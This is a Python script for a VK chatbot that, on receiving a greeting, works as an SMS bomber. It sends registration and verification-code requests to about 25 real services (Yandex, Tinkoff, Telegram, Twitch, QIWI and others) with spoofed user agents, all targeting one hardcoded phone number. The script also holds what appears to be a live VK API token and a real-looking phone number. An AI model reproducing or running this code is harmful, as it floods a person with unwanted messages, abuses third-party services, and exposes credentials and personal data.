import vk_api, requests, fake_useragent
from termcolor import colored
from vk_api.longpoll import VkLongPoll, VkEventType
from vk_api.utils import get_random_id
user = fake_useragent.UserAgent().random
headers = {'user_agent': user}
def write_msg(user_id, message):
    vk.method('messages.send', {'user_id': user_id, 'message': message, "random_id": get_random_id()})


# API-ключ созданный ранее
token = "9b720406d3ce593777a5fdb31c18b07a74ad8207ef1ff8ff85d41ecd932c5e4b8dd3c793d76e3f91e7524"

# Авторизуемся как сообщество
vk = vk_api.VkApi(token=token)

# Работа с сообщениями
longpoll = VkLongPoll(vk)

# Основной цикл
for event in longpoll.listen():

    # Если пришло новое сообщение
    if event.type == VkEventType.MESSAGE_NEW:

        # Если оно имеет метку для меня( то есть бота)
        if event.to_me:

            # Сообщение от пользователя
            request = event.text.lower()

            # Каменная логика ответа
            if request == "привет":
                write_msg(event.user_id, "Хай")
                phone = '79283692011'
                try:
                    a = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/", headers=headers)
                    print(colored('citilink-[+]', 'green'))
                except:
                    print(colored('citilink-[-]', 'green'))
                try:
                    a = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
                                  json={"reqId": "91101-1606335718",
                                        "params": {"phone": phone, "language": "ru-RU", "route": "sms",
                                                   "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}, headers=headers)
                    print(colored('icq-[+]', 'yellow'))
                except:
                    print(colored('icq-[-]', 'yellow'))
                try:
                    a = requests.post("https://taxi.yandex.ru/3.0/auth",
                                  json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": phone}, headers=headers)
                    print(colored('taxi.yandex-[+]', 'cyan'))
                except:
                    print(colored('taxi.yandex-[-]', 'cyan'))
                try:
                    a = requests.post("https://youla.ru/web-api/auth/request_code",
                                  json={"phone": phone}, headers=headers)
                    print(colored('youla-[+]', 'magenta'))
                except:
                    print(colored('youla-[-]', 'magenta'))
                try:
                    a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
                                  json={"phone_number": phone}, headers=headers)
                    print(colored('eda.yandex-[+]', 'yellow'))
                except:
                    print(colored('eda.yandex-[-]', 'yellow'))
                try:
                    a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
                                  data={"phone": phone}, headers=headers)
                    print(colored('shop.vsk-[+]', 'green'))
                except:
                    print(colored('shop.vsk-[-]', 'green'))
                try:
                    a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
                                  data={"phone": phone}, headers=headers)
                    print(colored('shop.vsk-[+]', 'green'))
                except:
                    print(colored('shop.vsk-[-]', 'green'))
                try:
                    a = requests.post("https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
                                  data={"st.r.phone": "+" + phone}, headers=headers)
                    print(colored('ok.ru-[+]', 'blue'))
                except:
                    print(colored('ok.ru-[-]', 'blue'))
                try:
                    a = requests.post("https://nn-card.ru/api/1.0/register",
                                      json={"phone": phone, "password": '57873456'}, headers=headers)
                    print(colored('my.modulbank-[+]', 'cyan'))
                except:
                    print(colored('my.modulbank-[-]', 'cyan'))
                try:
                    a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                  json={"CellPhone": phone[1:]}, headers=headers)
                    print(colored('my.modulbank-[+]', 'cyan'))
                except:
                    print(colored('my.modulbank-[-]', 'cyan'))
                try:
                    a = requests.post(
                    "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",

                    data={"phone": "+" + phone}, headers=headers)
                    print(colored('tinkoff-[+]', 'yellow'))
                except:
                    print(colored('tinkoff-[-]', 'yellow'))
                try:
                    a = requests.post("https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",

                                  data={"l": phone[1:]}, headers=headers)
                    print(colored('rutaxi-[+]', 'green'))
                except:
                    print(colored('rutaxi-[-]', 'green'))
                try:
                    a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                  data={"CellPhone": phone[1:]}, headers=headers)
                    print(colored('modulbank-[+]', 'magenta'))
                except:
                    print(colored('modulbank-[-]', 'magenta'))
                try:
                    a = requests.post("https://ng-api.webbankir.com/user/v2/create",
                                  json={"lastName": "уцвцу", "firstName": "цувцу", "middleName": "цуацуа",
                                        "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""}, headers=headers)
                    print(colored('webbankir-[+]', 'magenta'))
                except:
                    print(colored('webbankir-[-]', 'magenta'))
                try:
                   a = requests.post("https://stavropol.sushi-market.com/sendForm/callMeBack",
                                  json={"phone": phone[1:], "name": "Егор"}, headers=headers)
                   print(colored('stavropol-[+]', 'yellow'))
                except:
                    print(colored('stavropol-[-]', 'yellow'))
                try:
                   a = requests.post("https://m.tiktok.com/node-a/send/download_link",  json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone[1:],"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, headers=headers)
                   print(colored('tiktok-[+]', 'yellow'))
                except:
                    print(colored('tiktok-[-]', 'yellow'))
                try:
                    a = requests.post("https://api.sunlight.net/v3/customers/authorization/",  data={"phone": phone}, headers=headers)
                    print(colored('sunlight-[+]', 'cyan'))
                except:
                    print(colored('sunlight-[-]', 'cyan'))
                try:
                    a = requests.post("https://cloud.mail.ru/api/v2/notify/applink",
                    json={
                    "phone": "+" + phone,
                    "api": 2,
                    "email": 'dgirherfib@gmaqil.com',
                    "x-email": "x-email",
                    }, headers=headers)
                    print(colored('mail.ru-[+]', 'blue'))
                except:
                    print(colored('mail.ru-[-]', 'blue'))
                try:
                    a = requests.post("https://mobile-api.qiwi.com/oauth/authorize",
                    data={
                    "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                    "username": phone,
                    "client_id": "android-qw",
                    "client_secret": "zAm4FKq9UnSe7id",
                    }, headers=headers)
                    print(colored('qiwi-[+]', 'magenta'))
                except:
                    print(colored('qiwi-[-]', 'magenta'))
                try:
                   a = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
                                     json={"phone": "+" + phone}, headers=headers)
                   print(colored('tiktok-[+]', 'yellow'))
                except:
                    print(colored('tiktok-[-]', 'yellow'))
                try:
                    a = requests.post("https://passport.twitch.tv/register?trusted_request=true",
                    json={
                    "birthday": {"day": 12, "month": 10, "year": 2000},
                    "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                    "include_verification_code": True,
                    "password": 'Danil5564554',
                    "phone_number": phone,
                    "username": 'bhtrtrrrtbhtrbhtr',
                    }, headers=headers)
                    print(colored('twitch.tv-[+]', 'yellow'))
                except:
                    print(colored('twitch.tv-[-]', 'yellow'))
                try:
                    a = requests.post("https://my.telegram.org/auth/send_password",
                    data={"phone": "+" + phone}, headers=headers)
                    print(colored('telegram-[+]', 'magenta'))
                except:
                    print(colored('telegram-[-]', 'magenta'))
                try:
                    a = requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                    params={'msisdn': phone}, headers=headers)
                    print(colored('mts.ru-[+]', 'cyan'))
                except:
                    print(colored('mts.ru-[-]', 'cyan'))
                try:
                    a = requests.post('https://www.etm.ru/cat/runprog.html',
                    data={'m_phone': phone, 'mode': 'sendSms', 'syf_prog': 'clients-services', 'getSysParam': 'yes'}, headers=headers)
                    print(colored('etm.ru-[+]', 'green'))
                except:
                    print(colored('etm.ru-[-]', 'green'))
            elif request == "пока":
                a = open(str(event.user_id) + "c.txt", "w")
                a.write("1")
                a.close()
                write_msg(event.user_id, "Пока((")
            else:
                write_msg(event.user_id, "Не поняла вашего ответа...")

